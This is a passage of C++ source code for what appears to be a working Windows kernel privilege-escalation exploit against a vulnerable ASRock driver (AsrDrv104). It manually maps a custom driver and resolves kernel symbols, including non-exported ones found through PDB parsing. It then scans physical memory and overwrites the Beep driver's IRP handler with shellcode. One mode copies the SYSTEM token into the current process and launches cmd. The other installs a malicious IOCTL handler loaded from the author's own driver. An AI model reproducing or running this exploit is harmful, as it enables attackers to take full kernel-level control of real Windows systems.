        // OFT, which is a 64bit struct
        IMAGE_THUNK_DATA* cur_thunk = (IMAGE_THUNK_DATA*)((uintptr_t)some_memory + import_descriptor->OriginalFirstThunk);
        void** iat = (void**)((uintptr_t)some_memory + import_descriptor->FirstThunk);
        // loop through array of thunks starting at original first thunk
        while (cur_thunk->u1.Function != 0) {
            if (cur_thunk->u1.Function & 0x80000000) {
                // then we have ordinal number which is import into Export directory table
                printf("Not supported\n");
                bye();
            }
            else {
                // it is RVA to a struct of type IMAGE_IMPORT_BY_NAME (which has addr and name)
                IMAGE_IMPORT_BY_NAME* name_data = (IMAGE_IMPORT_BY_NAME*)((uintptr_t)some_memory + cur_thunk->u1.Function);
                char* name_of_function = (char*)(name_data->Name);
                printf("\n");
                printf("Importing %s\n", name_of_function);

                void* function_addr = GetProcAddress(hModule, name_of_function);
                uint64_t func_offset = (uint64_t)function_addr - (uint64_t)hModule;
                void* real_addr = (void*)((uint64_t)KernelModules[name_of_module] + func_offset);
                *iat = (void*)real_addr;
                printf("%s at %#llx\n", name_of_function, real_addr);
            }

            cur_thunk++;
            iat++;
        }
        import_descriptor++; // +20 bytes

    }
    // relocs
    // Find address of reloc table and add to start of memory
    IMAGE_DATA_DIRECTORY* reloc_directory_info = (IMAGE_DATA_DIRECTORY*)&fileHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    IMAGE_BASE_RELOCATION* cur_reloc = (IMAGE_BASE_RELOCATION*)((uintptr_t)some_memory + reloc_directory_info->VirtualAddress);

    // find the end address of the reloc table as well since we have the size of it
    void* reloc_table_end = (void*)((uintptr_t)cur_reloc + reloc_directory_info->Size);

    uintptr_t imageBaseDifference = (uintptr_t)some_memory - fileHeader->OptionalHeader.ImageBase;

    // loop through all relocs in reloc DIRECTORY
    while (cur_reloc != reloc_table_end) {
        printf("\n");
        ULONG size_of_block = cur_reloc->SizeOfBlock;
        ULONG rva = cur_reloc->VirtualAddress;

        // loop through all entries in this current reloc (2 bytes each)
        int num_entries = (size_of_block - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(__int16);
        printf("Relocing %d entries\n", num_entries);

        // skip the first 8 bytes (its just descriptor info)
        uint16_t* reloc_entry = (uint16_t*)((uintptr_t)cur_reloc + sizeof(IMAGE_BASE_RELOCATION));
        for (int i = 0; i < num_entries; i++) {
            // high 4 bits is the offset type, low 12 is the offset
            uint16_t offset = *reloc_entry & 0xFFF;
            USHORT reloc_type = *reloc_entry >> 12;


            // reloc type #0 (absolute) and #10 (DIR64) is most common.
            if (reloc_type == IMAGE_REL_BASED_DIR64) {
                printf("reloc of type IMAGE_REL_BASED_DIR64 at offset %#x+%#llx\n", rva, offset);

                // dont do relocs here, we need to do in the driver since we don't know the imageBase
                // yet during the payload generation
                // ULONG64* reloc_spot = (ULONG64*)((uintptr_t)some_memory + rva + offset);
                // *reloc_spot += imageBaseDifference;
            }
            else if (reloc_type == IMAGE_REL_BASED_ABSOLUTE) {
                printf("reloc of type IMAGE_REL_BASED_ABSOLUTE at offset %#x+%#llx\n", rva, offset);
            }
            else {
                printf("Reloc type not supported: type %x\n", reloc_type);
                bye();
            }
            reloc_entry++;
        }
        // add the size of the reloc section to get to next reloc descriptor
        cur_reloc = (IMAGE_BASE_RELOCATION*)((uintptr_t)cur_reloc + cur_reloc->SizeOfBlock);
    }



    // prepare the payload
    size_t payload_sz = imageSize;
    my_shellcode_data_sz = sizeof(MyIrpStruct) + payload_sz;
    my_shellcode_data = (MyIrpStruct*)malloc(my_shellcode_data_sz);
    if (!my_shellcode_data)
    {
        printf("malloc fails\n");
        bye();
    }
    memcpy(my_shellcode_data->payload, some_memory, payload_sz);
    my_shellcode_data->payload_size = payload_sz;
    printf("payload size = %llx bytes\n", my_shellcode_data_sz);

}



#define SYSTEM_PRIVS 0
#define MALICIOUS_IOCTL_HANDLER 1

// a macro for finding and storing a function ptr for a certain function
#define FIND_FUNCTION(name) { \
  void* addr = (void*)GetProcAddress(hNtoskrnl, #name);\
  if (!addr) {\
    printf("Couldn't resolve %s\n", #name);\
    bye();\
  }\
  uintptr_t offset = (uint64_t)addr - (uint64_t)hNtoskrnl;\
  (my_shellcode_data->nt_##name) = (decltype(my_shellcode_data->nt_##name))((uintptr_t)addr - (uintptr_t)hNtoskrnl + ntoskrnl_base);\
  printf("[ntoskrnl] %s at physical address %#llx + %#llx = %#llx\n", #name, ntoskrnl_base, offset, (LPVOID)(my_shellcode_data->nt_##name));\
}


void create_ioctl_payload(int s)
{
    uint64_t ntoskrnl_base = KernelModules["ntoskrnl.exe"];
    if (!ntoskrnl_base)
    {
        printf("Can't find address of ntoskrnl.exe\n");
        bye();
    }

    printf("ntoskrnl at %p\n", ntoskrnl_base);

    printf("\n");
    if (s == SYSTEM_PRIVS) {
        my_shellcode_data = (MyIrpStruct*)malloc(sizeof(void*));

        // location of global variable PsInitialSystemProcess in ntoskrnl.exe, of type PEPROCESS (ptr to EPROCESS)
        uint64_t address_of_ptr_to_eprocess = (ntoskrnl_base + 0xCFC420);
        // void* ptr_to_eprocess = *(void**)(address_of_ptr_to_eprocess);
        *(void**)my_shellcode_data = (void*)address_of_ptr_to_eprocess;
        my_shellcode_data_sz = sizeof(MyIrpStruct);
        return;
    }


    HMODULE hNtoskrnl = LoadLibraryExA("ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!hNtoskrnl)
    {
        puts("failed to map ntoskrnl");
        bye();
    }

    printf("ntoskrnl loaded at %#llx, physical addr at %llx\n", hNtoskrnl, ntoskrnl_base);
    my_shellcode_data->ntoskrnl = (void*)ntoskrnl_base;

    // find all of our functions and load them into the ioctl that we will send to our driver
    //void* memcpy = GetProcAddress(hNtoskrnl, "memcpy"); // get the memcpy export
    //uint64_t memcpy_offset = (uint64_t)memcpy - (uint64_t)hNtoskrnl;
    //uint64_t addr2 = memcpy_offset + ntoskrnl_base;
    //my_shellcode_data->nt_memcpy = (void (*)(void* dst, void* src, size_t len))(addr2);
    //printf("krnl memcpy at physical address %#llx + %#llx = %#llx\n", ntoskrnl_base, memcpy_offset, my_shellcode_data->nt_memcpy);

    //void* ExAllocatePoolWithTag = GetProcAddress(hNtoskrnl, "ExAllocatePoolWithTag"); // get the memcpy export
    //uint64_t allocate_offset = (uint64_t)ExAllocatePoolWithTag - (uint64_t)hNtoskrnl;
    //my_shellcode_data->ExAllocatePoolWithTag = (void* (*)(ULONG PoolType, SIZE_T NumberOfBytes, ULONG Tag))(allocate_offset + ntoskrnl_base);
    //printf("krnl ExAllocate at physical address %#llx + %#llx = %#llx\n", ntoskrnl_base, allocate_offset, my_shellcode_data->ExAllocatePoolWithTag);

    //void* nt_PsCreateSystemThread = GetProcAddress(hNtoskrnl, "PsCreateSystemThread"); // get the memcpy export
    //uint64_t ps_offset = (uint64_t)nt_PsCreateSystemThread - (uint64_t)hNtoskrnl;
    //my_shellcode_data->nt_PsCreateSystemThread = (NTSTATUS(*)(PHANDLE ThreadHandle, ULONG DesiredAccess, void* ObjectAttributes, HANDLE ProcessHandle, void* ClientId, void* StartRoutine, PVOID StartContext))(ps_offset + ntoskrnl_base);
    //printf("krnl PsCreateSystemThread at physical address %#llx + %#llx = %#llx\n", ntoskrnl_base, ps_offset, my_shellcode_data->nt_PsCreateSystemThread);

    //void* completeRequest = GetProcAddress(hNtoskrnl, "IofCompleteRequest"); // get the memcpy export
    //uint64_t IOCR_offset = (uint64_t)completeRequest - (uint64_t)hNtoskrnl;
    //my_shellcode_data->IofCompleteRequest = (void*)(IOCR_offset + ntoskrnl_base);
    //printf("krnl completeRequest at physical address %#llx + %#llx = %#llx\n", ntoskrnl_base, IOCR_offset, my_shellcode_data->IofCompleteRequest);

    FIND_FUNCTION(memcpy);
    FIND_FUNCTION(ExAllocatePoolWithTag);
    FIND_FUNCTION(PsCreateSystemThread);
    FIND_FUNCTION(IofCompleteRequest);

    printf("\nStarting PDB Parser\n");
    // use the pdb parser to get symbols that aren't exported
    std::vector<std::string> pdbs = { R"(C:\Windows\System32\ntoskrnl.exe)" };

    // first load symbol paths
    bool pdbret = PdbParser.LocatePdbs(pdbs);
    if (!pdbret) {
        printf("PDB parsing failed\n");
        bye();
    }
    // get the virtual offset from beginning of module to the desired symbol
    uintptr_t rva_of_MiLookupDataTableEntry = PdbParser.LocateSymbol("MiLookupDataTableEntry");
    printf("MiLookupDataTableEntry is offset %x from ntoskrnl start\n", rva_of_MiLookupDataTableEntry);
    my_shellcode_data->nt_MiLookupDataTableEntry = (ntoskrnl_base + rva_of_MiLookupDataTableEntry);
    printf("MiLookupDataTableEntry (non-exported function) at %p\n", my_shellcode_data->nt_MiLookupDataTableEntry);

    uintptr_t rva_of_PsGetNextProcess = PdbParser.LocateSymbol("PsGetNextProcess");
    printf("PsGetNextProcess is offset %x from ntoskrnl start\n", rva_of_PsGetNextProcess);
    my_shellcode_data->nt_PsGetNextProcess = ((uintptr_t)ntoskrnl_base + rva_of_PsGetNextProcess);
    printf("PsGetNextProcess (non-exported function) at %p\n", my_shellcode_data->nt_PsGetNextProcess);

    uintptr_t rva_of_ExUnlockHandleTableEntry = PdbParser.LocateSymbol("ExUnlockHandleTableEntry");
    printf("ExUnlockHandleTableEntry is offset %x from ntoskrnl start\n", rva_of_ExUnlockHandleTableEntry);
    my_shellcode_data->nt_ExUnlockHandleTableEntry = ((uintptr_t)ntoskrnl_base + rva_of_ExUnlockHandleTableEntry);
    printf("ExUnlockHandleTableEntry (non-exported function) at %p", my_shellcode_data->nt_ExUnlockHandleTableEntry);

    // printf("Hello\n");
    // print_buf(my_shellcode_data, my_shellcode_data_sz);
}


// creates the shellcode by overwriting the real address of MyIRPControl with our shellcode from our malicious driver
void generate_shellcode(int s)
{
    printf("\n");
    memset(my_shellcode, 0, sizeof(my_shellcode));
    if (s == MALICIOUS_IOCTL_HANDLER) {
        // Load in our driver
        HMODULE my_driver = LoadLibraryExA("C:\\Users\\reige\\Desktop\\visual studio projects\\cve\\x64\\Debug\\MyDriver1.sys", NULL, DONT_RESOLVE_DLL_REFERENCES);
        printf("my_driver at %#x\n", my_driver);
        if (!my_driver)
        {
            printf("failed to map MyDriver1.sys\n");
            bye();
        }
        // find the exported ioctl handler
        void* driver_ioctl_handler_addr = (void*)GetProcAddress(my_driver, "MyIRPControl");
        printf("Our IRP control at %#x\n", driver_ioctl_handler_addr);
        if (!driver_ioctl_handler_addr) {
            printf("No shellcode\n");
            bye();
        }
        memcpy(my_shellcode, driver_ioctl_handler_addr, 0x1000);
        FreeLibrary(my_driver);
        printf("Asm from our patched irp control:\n");
        print_buf(my_shellcode, 0x20);
    }
    else if (s == SYSTEM_PRIVS) {
        // https://j00ru.vexillium.org/2018/07/exploiting-a-windows-10-pagedpool-off-by-one/
        // The plan is to pass in a ptr to a EPROCESS into SystemBuffer. System buffer is 
        // accessible via [rdx+0x18], so that's why we need the first line.
        // The shellcode takes the address of a pointer to a process object in the kernel in the first
        // argument (RCX), and copies its security token to the current process.
        // 
        //
        // 00000000  65488B0425880100  mov rax, [gs:KPCR.Prcb.CurrentThread]
        // -00
        // 00000009  488B80B8000000    mov rax, [rax + ETHREAD.Tcb.ApcState.Process]
        // 00000010  488B09            mov rcx, [rcx]
        // 00000013  488B8958030000    mov rcx, [rcx + EPROCESS.Token]
        // 0000001A  48898858030000    mov [rax + EPROCESS.Token], rcx
        // 00000021  C3                ret
        CONST BYTE shellcode[] =
            "\x48\x8B\x4A\x18" // mov rcx, [rdx+0x18]. Moves IRP->SystemBuffer into rcx.
            "\x48\x8B\x09" // mov rcx, [rcx]. Moves the pointer to EPROCESS into rcx. (rcx before this holds address of PEPROCESS, aka double ptr)
            "\x65\x48\x8B\x04\x25\x88\x01\x00\x00\x48\x8B\x80\xB8\x00\x00\x00"
            "\x48\x8B\x09\x48\x8B\x89\x58\x03\x00\x00\x48\x89\x88\x58\x03\x00"
            "\x00\xC3";
        memcpy(my_shellcode, shellcode, sizeof(shellcode));
        printf("Asm from our patched irp control:\n");
        print_buf(my_shellcode, 0x20);
    }
}

// Provide some imports for our manual mapper shellcode.
void Get_kernel_offsets()
{
    uint64_t ntoskrnl_base = KernelModules["ntoskrnl.exe"];

    if (!ntoskrnl_base)
    {
        printf("Can't find address of ntoskrnl.exe\n");
        bye();
    }

    printf("ntoskrnl at %p\n", ntoskrnl_base);

    HMODULE hNtoskrnl = LoadLibraryExA("ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!hNtoskrnl)
    {
        puts("failed to map ntoskrnl");
        bye();
    }

    my_shellcode_data->ntoskrnl = (void*)ntoskrnl_base;

    // GetProcAddress stuff for manual mapper shellcode

    // lmao.
#define do_get_proc_offset(name) { \
void* addr = (void*)GetProcAddress(hNtoskrnl, #name); \
if (!addr) { \
  printf("failed to resolve %s\n", #name); \
  bye(); \
} \
(my_shellcode_data->nt_##name) = (decltype(my_shellcode_data->nt_##name)) (ntoskrnl_base + (uint64_t)addr - (uint64_t)hNtoskrnl); \
printf("nt!" #name " at %p\n", (LPVOID) (my_shellcode_data->nt_##name)); \
}

    do_get_proc_offset(memcpy);
    do_get_proc_offset(ExAllocatePoolWithTag);
    do_get_proc_offset(PsCreateSystemThread);
    do_get_proc_offset(IofCompleteRequest);

#undef do_get_proc_offset
}

void Get_shellcode()
{
    printf("\n");
    // Shellcode to allocate-copy-startthread shellcode
    HMODULE my_driver = LoadLibraryExA("C:\\Users\\reige\\Desktop\\re stuf\\MyDriver1\\MyDriver1.sys", NULL, DONT_RESOLVE_DLL_REFERENCES);
    printf("my_driver at %p\n", my_driver);
    if (!my_driver)
    {
        printf("failed to map MyDriver1.sys\n");
        bye();
    }
    void* shellcode = (void*)GetProcAddress(my_driver, "MyIRPHandler");
    if (!shellcode)
    {
        puts("Failed to load shellcode");
        bye();
    }
    printf("shellcode at %p\n", shellcode);
    memcpy(my_shellcode, shellcode, FOUR_KB);
    FreeLibrary(my_driver);
    //hexdump(my_shellcode, 0x1000);
}

int main()
{
    // for the DLL search path, when we call stuff like CreateFile or LoadLibrary
    AddDllDirectory(L"C:\\Windows\\System32\\drivers");
    int exploit_type = MALICIOUS_IOCTL_HANDLER;


    Enum_kernel_modules();


    // don't need this, if calling manual_map. Otherwise we do, since the payload won't be initialized.
    //size_t payload_sz = 1;
    //BYTE payload[1] = { 0xC3 };
    //my_shellcode_data_sz = sizeof(MyIrpStruct) + payload_sz;
    //my_shellcode_data = (MyIrpStruct*)malloc(my_shellcode_data_sz);
    //if (!my_shellcode_data)
    //{
    //  printf("malloc fails\n");
    //  bye();
    //}
    //memcpy(my_shellcode_data->payload, payload, payload_sz);
    //my_shellcode_data->payload_size = payload_sz;
    //printf("fake irp handler data block size = %llx\n", my_shellcode_data_sz);

    manual_map("MyDriver1.sys");

    create_ioctl_payload(exploit_type);
    generate_shellcode(exploit_type);


    ScanPhysicalMemory();

    hBeep = CreateFileA("\\\\.\\GlobalRoot\\Device\\Beep", GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    printf("hBeep = %p\n", hBeep);

    if (hBeep == INVALID_HANDLE_VALUE)
    {
        printf("GLE = %x\n", GetLastError());
        bye();
    }

    hDevice = CreateFileA("\\\\.\\GlobalRoot\\Device\\AsrDrv104", GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    printf("hDevice = %p\n", hDevice);

    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("GLE = %x\n", GetLastError());
        bye();
    }

    patch_beep();

    call_hacked_driver();

    if (exploit_type == SYSTEM_PRIVS) {
        // rum a shell
        system("cmd");
    }

    bye();
}
